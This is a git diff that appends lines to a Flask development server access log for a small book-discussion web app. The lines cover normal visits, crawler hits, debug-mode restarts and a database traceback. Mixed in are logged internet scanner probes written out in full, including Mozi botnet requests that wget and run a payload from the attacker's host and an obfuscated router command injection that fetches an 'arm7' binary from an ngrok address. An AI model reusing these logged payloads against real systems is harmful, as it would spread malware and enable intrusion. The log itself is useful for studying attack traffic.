@@ -6470,3 +6470,1774 @@ IndexError: list index out of range
 124.49.105.89 - - [19/Oct/2020 12:47:00] "[37mGET / HTTP/1.1[0m" 200 -
 124.49.105.89 - - [19/Oct/2020 12:47:33] "[37mGET / HTTP/1.1[0m" 200 -
 124.49.105.89 - - [19/Oct/2020 12:47:33] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:01:31] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:01:31] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:01:36] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:01:36] "[37mGET / HTTP/1.1[0m" 200 -
+116.100.71.237 - - [19/Oct/2020 13:02:47] "[37mGET / HTTP/1.1[0m" 200 -
+115.48.196.167 - - [19/Oct/2020 13:04:07] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
+124.49.105.89 - - [19/Oct/2020 13:12:58] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:12:58] "[37mGET / HTTP/1.1[0m" 200 -
+220.64.103.2 - - [19/Oct/2020 13:13:03] "[37mGET / HTTP/1.1[0m" 200 -
+211.231.106.30 - - [19/Oct/2020 13:13:03] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:16] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:16] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:16] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:16] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:16] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:16] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:16] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:16] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:19] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+124.49.105.89 - - [19/Oct/2020 13:13:35] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:13:35] "[37mGET / HTTP/1.1[0m" 200 -
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [19/Oct/2020 13:24:41] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:41] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:42] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:42] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:43] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:43] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:44] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:44] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:47] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:47] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:47] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:47] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:47] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:47] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:47] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:47] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:48] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:48] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:50] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:50] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:50] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:50] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:50] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:50] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:50] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:24:51] "[37mGET / HTTP/1.1[0m" 200 -
+203.133.180.77 - - [19/Oct/2020 13:25:00] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:01] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:01] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:01] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:01] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:01] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:01] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:01] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:01] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:02] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+124.49.105.89 - - [19/Oct/2020 13:25:23] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:24] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:24] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:24] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:24] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:24] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:24] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:24] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:25] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+124.49.105.89 - - [19/Oct/2020 13:25:48] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:48] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:48] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:48] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:48] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:48] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:48] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:25:48] "[37mGET / HTTP/1.1[0m" 200 -
+ * Serving Flask app "app" (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: on
+ * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 333-203-131
+124.49.105.89 - - [19/Oct/2020 13:28:22] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:22] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:25] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:25] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:29] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:29] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:29] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:29] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:29] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:29] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:29] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:29] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:30] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+124.49.105.89 - - [19/Oct/2020 13:28:36] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:36] "[37mGET / HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:39] "[37mGET /write HTTP/1.1[0m" 200 -
+124.49.105.89 - - [19/Oct/2020 13:28:39] "[37mGET / HTTP/1.1[0m" 200 -
+211.231.106.26 - - [19/Oct/2020 13:32:39] "[37mGET / HTTP/1.1[0m" 200 -
+18.140.20.14 - - [19/Oct/2020 13:45:57] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
+193.27.228.27 - - [19/Oct/2020 14:06:43] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
+193.27.228.27 - - [19/Oct/2020 14:06:52] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
+193.27.228.27 - - [19/Oct/2020 14:16:40] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
+193.27.228.27 - - [19/Oct/2020 14:27:22] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
+193.27.228.27 - - [19/Oct/2020 14:32:01] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1[0m" 404 -
+200.105.207.182 - - [19/Oct/2020 15:15:25] "[37mGET / HTTP/1.1[0m" 200 -
+193.27.228.27 - - [19/Oct/2020 16:28:00] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
+23.102.165.6 - - [19/Oct/2020 16:48:08] "[33mGET /jmx-console/ HTTP/1.1[0m" 404 -
+41.216.186.89 - - [19/Oct/2020 16:57:38] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+41.216.186.89 - - [19/Oct/2020 16:57:38] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+122.116.160.103 - - [19/Oct/2020 17:04:27] "[37mGET / HTTP/1.1[0m" 200 -
+122.117.173.249 - - [19/Oct/2020 17:17:07] "[37mGET / HTTP/1.1[0m" 200 -
+52.252.230.176 - - [19/Oct/2020 17:39:41] "[37mGET / HTTP/1.1[0m" 200 -
+171.246.110.241 - - [19/Oct/2020 17:49:45] "[37mGET / HTTP/1.1[0m" 200 -
+209.17.96.234 - - [19/Oct/2020 17:58:48] "[37mGET / HTTP/1.1[0m" 200 -
+27.147.135.42 - - [19/Oct/2020 18:19:08] "[37mGET / HTTP/1.1[0m" 200 -
+82.57.187.7 - - [19/Oct/2020 18:30:39] "[37mGET / HTTP/1.1[0m" 200 -
+71.6.232.2 - - [19/Oct/2020 18:44:34] "[37mGET / HTTP/1.1[0m" 200 -
+182.117.83.43 - - [19/Oct/2020 19:45:21] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.117.83.43:33382/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+74.120.14.35 - - [19/Oct/2020 20:36:09] "[37mGET / HTTP/1.1[0m" 200 -
+74.120.14.35 - - [19/Oct/2020 20:36:09] "[37mGET / HTTP/1.1[0m" 200 -
+83.97.20.29 - - [19/Oct/2020 21:02:42] "[37mGET / HTTP/1.0[0m" 200 -
+193.27.228.27 - - [19/Oct/2020 21:10:42] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+109.87.190.5 - - [19/Oct/2020 21:25:16] "[37mGET / HTTP/1.1[0m" 200 -
+114.35.108.212 - - [19/Oct/2020 21:59:46] "[37mGET / HTTP/1.1[0m" 200 -
+37.46.134.25 - - [19/Oct/2020 22:01:21] "[33mPOST /subscription2/getPromoPackage HTTP/1.1[0m" 404 -
+193.27.228.27 - - [19/Oct/2020 22:23:40] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+94.102.49.50 - - [19/Oct/2020 22:30:32] "[33mGET /.env HTTP/1.1[0m" 404 -
+94.102.49.50 - - [19/Oct/2020 22:30:32] "[31m[1mPOST / HTTP/1.1[0m" 405 -
+129.28.78.146 - - [19/Oct/2020 22:45:39] "[33mGET /TP/public/index.php HTTP/1.1[0m" 404 -
+129.28.78.146 - - [19/Oct/2020 22:45:39] "[33mGET /TP/index.php HTTP/1.1[0m" 404 -
+129.28.78.146 - - [19/Oct/2020 22:45:40] "[33mGET /thinkphp/html/public/index.php HTTP/1.1[0m" 404 -
+129.28.78.146 - - [19/Oct/2020 22:45:40] "[33mGET /html/public/index.php HTTP/1.1[0m" 404 -
+129.28.78.146 - - [19/Oct/2020 22:45:40] "[33mGET /public/index.php HTTP/1.1[0m" 404 -
+129.28.78.146 - - [19/Oct/2020 22:45:40] "[33mGET /TP/html/public/index.php HTTP/1.1[0m" 404 -
+129.28.78.146 - - [19/Oct/2020 22:45:41] "[33mGET /elrekt.php HTTP/1.1[0m" 404 -
+129.28.78.146 - - [19/Oct/2020 22:45:41] "[33mGET /index.php HTTP/1.1[0m" 404 -
+129.28.78.146 - - [19/Oct/2020 22:45:41] "[37mGET / HTTP/1.1[0m" 200 -
+209.17.96.130 - - [19/Oct/2020 23:26:38] "[37mGET / HTTP/1.1[0m" 200 -
+162.142.125.34 - - [20/Oct/2020 00:26:16] "[37mGET / HTTP/1.1[0m" 200 -
+162.142.125.34 - - [20/Oct/2020 00:26:17] "[37mGET / HTTP/1.1[0m" 200 -
+185.39.11.105 - - [20/Oct/2020 00:37:39] "[37mGET http://example.com/ HTTP/1.1[0m" 200 -
+203.133.180.83 - - [20/Oct/2020 01:46:09] "[37mGET / HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:10] "[37mGET / HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:11] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:11] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:11] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:11] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:11] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:11] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:11] "[37mGET / HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:12] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+106.101.64.184 - - [20/Oct/2020 01:46:19] "[37mGET /write HTTP/1.1[0m" 200 -
+106.101.64.184 - - [20/Oct/2020 01:46:19] "[37mGET / HTTP/1.1[0m" 200 -
+3.89.4.147 - - [20/Oct/2020 01:50:10] code 400, message Bad request syntax ('\x16\x03\x01\x01D\x01\x00\x01@\x03\x03Úb\x1b\x17Y´HÃÇ\x16õÁjG)8\x81ð[\x93Áe\x98üàCozf@¨7 ´\x89\x16Fé\x11\x1f$â\xa0©Ü\x1aÚ\x13\x96.\x14\x95ö/7ÎÍì\x8b\x14²\x88£¦\x1a\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+3.89.4.147 - - [20/Oct/2020 01:50:10] "[35m[1mD @ÚbY´HÃÇõÁjG)8ð[ÁeüàCozf@¨7 ´Fé$â ©ÜÚ.ö/7ÎÍì²£¦ bÀ,À0À+À/Ì©Ì¨ £  ¢ ÌªÀ¯À­À$À(À[0m" HTTPStatus.BAD_REQUEST -
+213.202.223.223 - - [20/Oct/2020 02:12:44] "[37mGET / HTTP/1.1[0m" 200 -
+41.86.19.77 - - [20/Oct/2020 02:18:09] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://41.86.19.77:55421/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+193.27.228.27 - - [20/Oct/2020 02:48:10] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
+193.27.228.27 - - [20/Oct/2020 02:48:22] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
+193.27.228.27 - - [20/Oct/2020 02:51:21] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
+193.27.228.27 - - [20/Oct/2020 02:55:31] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
+193.27.228.27 - - [20/Oct/2020 02:57:02] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1[0m" 404 -
+128.14.134.134 - - [20/Oct/2020 03:14:02] "[33mGET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1[0m" 404 -
+83.97.20.189 - - [20/Oct/2020 03:34:04] code 400, message Bad request version ('Ý%d1\x17¦%nÅ')
+83.97.20.189 - - [20/Oct/2020 03:34:04] "[35m[1mÉÑ¦®lM/	p#î*5#]ÇR:È/¸ÍZû¤fÒÎ³¡»ü Ý%d1¦%nÅ[0m" HTTPStatus.BAD_REQUEST -
+193.27.228.27 - - [20/Oct/2020 03:37:03] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
+185.107.247.87 - - [20/Oct/2020 03:54:18] "[37mGET / HTTP/1.1[0m" 200 -
+1.34.130.139 - - [20/Oct/2020 04:06:00] "[37mGET / HTTP/1.1[0m" 200 -
+139.162.106.181 - - [20/Oct/2020 04:22:44] "[37mGET / HTTP/1.1[0m" 200 -
+209.17.97.34 - - [20/Oct/2020 04:45:07] "[37mGET / HTTP/1.0[0m" 200 -
+193.27.228.27 - - [20/Oct/2020 05:13:16] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+193.27.228.27 - - [20/Oct/2020 05:38:57] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
+113.220.119.83 - - [20/Oct/2020 06:13:26] "[33mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 404 -
+78.187.234.69 - - [20/Oct/2020 06:28:00] "[33mPOST /news/index.php HTTP/1.1[0m" 404 -
+185.202.2.68 - - [20/Oct/2020 07:13:48] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+185.202.2.68 - - [20/Oct/2020 07:13:48] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
+80.82.70.118 - - [20/Oct/2020 08:02:18] "[37mGET / HTTP/1.0[0m" 200 -
+134.19.215.196 - - [20/Oct/2020 08:31:38] "[33mPOST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1[0m" 404 -
+192.241.238.248 - - [20/Oct/2020 08:35:59] "[33mGET /hudson HTTP/1.1[0m" 404 -
+112.30.1.159 - - [20/Oct/2020 08:36:56] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://112.30.1.159:56443/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
+103.237.173.186 - - [20/Oct/2020 09:34:38] "[37mGET / HTTP/1.1[0m" 200 -
+189.126.94.252 - - [20/Oct/2020 09:56:54] "[37mGET / HTTP/1.1[0m" 200 -
+192.241.234.53 - - [20/Oct/2020 12:47:11] "[33mGET /ReportServer HTTP/1.1[0m" 404 -
+66.249.75.245 - - [20/Oct/2020 12:49:05] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+66.249.75.243 - - [20/Oct/2020 12:49:06] "[37mGET / HTTP/1.1[0m" 200 -
+66.249.75.247 - - [20/Oct/2020 12:49:09] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+66.249.75.243 - - [20/Oct/2020 12:49:09] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+66.249.75.243 - - [20/Oct/2020 12:49:10] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+66.249.75.243 - - [20/Oct/2020 12:49:10] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+66.249.75.243 - - [20/Oct/2020 12:49:11] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+66.249.75.243 - - [20/Oct/2020 12:49:11] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+66.249.75.247 - - [20/Oct/2020 12:56:57] "[37mGET /detail?id=5f8d8ac147639fbc089365da HTTP/1.1[0m" 200 -
+66.249.75.245 - - [20/Oct/2020 12:58:58] "[37mGET / HTTP/1.1[0m" 200 -
+66.249.75.245 - - [20/Oct/2020 12:59:40] "[37mGET /static/js/function.js HTTP/1.1[0m" 200 -
+66.249.75.245 - - [20/Oct/2020 12:59:41] "[37mGET /static/css/style.css HTTP/1.1[0m" 200 -
+66.249.75.243 - - [20/Oct/2020 12:59:44] "[37mGET /static/css/write.css HTTP/1.1[0m" 200 -
+66.249.75.247 - - [20/Oct/2020 12:59:44] "[37mGET /static/css/detail.css HTTP/1.1[0m" 200 -
+66.249.75.245 - - [20/Oct/2020 12:59:45] "[37mGET /static/css/check.css HTTP/1.1[0m" 200 -
+66.249.75.243 - - [20/Oct/2020 12:59:45] "[37mGET /static/css/variables.css HTTP/1.1[0m" 200 -
+66.249.75.243 - - [20/Oct/2020 13:00:41] "[37mGET / HTTP/1.1[0m" 200 -
+162.243.128.57 - - [20/Oct/2020 13:05:57] "[37mGET / HTTP/1.1[0m" 200 -
+176.113.115.89 - - [20/Oct/2020 13:19:43] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
+176.113.115.89 - - [20/Oct/2020 13:19:43] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
+136.232.243.54 - - [20/Oct/2020 13:25:24] "[33mPOST /news/index.php HTTP/1.1[0m" 404 -
+176.113.115.89 - - [20/Oct/2020 13:25:29] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
+176.113.115.89 - - [20/Oct/2020 13:34:46] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
+176.113.115.89 - - [20/Oct/2020 13:37:13] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP HTTP/1.1[0m" 404 -
+177.11.136.6 - - [20/Oct/2020 14:09:22] "[37mGET / HTTP/1.1[0m" 200 -
+167.249.76.8 - - [20/Oct/2020 14:41:42] "[37mGET / HTTP/1.1[0m" 200 -
+80.82.65.80 - - [20/Oct/2020 15:06:59] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
+176.113.115.89 - - [20/Oct/2020 15:15:02] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
+71.6.165.200 - - [20/Oct/2020 15:33:09] "[37mGET / HTTP/1.1[0m" 200 -
+71.6.165.200 - - [20/Oct/2020 15:33:10] "[33mGET /robots.txt HTTP/1.1[0m" 404 -
+71.6.165.200 - - [20/Oct/2020 15:33:11] "[33mGET /sitemap.xml HTTP/1.1[0m" 404 -
+71.6.165.200 - - [20/Oct/2020 15:33:11] "[33mGET /.well-known/security.txt HTTP/1.1[0m" 404 -
+71.6.165.200 - - [20/Oct/2020 15:33:12] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
+35.205.219.55 - - [20/Oct/2020 16:02:17] "[37mGET / HTTP/1.1[0m" 200 -
+88.236.55.181 - - [20/Oct/2020 16:12:18] "[35m[1mGET / HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/home/ubuntu/booksalon_flask/app.py", line 30, in home
+    question_list = list(db.questions.find({}))
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/cursor.py", line 1207, in next
+    if len(self.__data) or self._refresh():
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/cursor.py", line 1100, in _refresh
+    self.__session = self.__collection.database.client._ensure_session()
+  File "/home/ubuntu/.local/share/virtualenvs/booksalon_flask-0AKjrcsX/lib/python3.6/site-packages/pymongo/mongo_client.py", line 1816, in _ensure_session
+    return self.__start_session(True, causal_consistency=False)
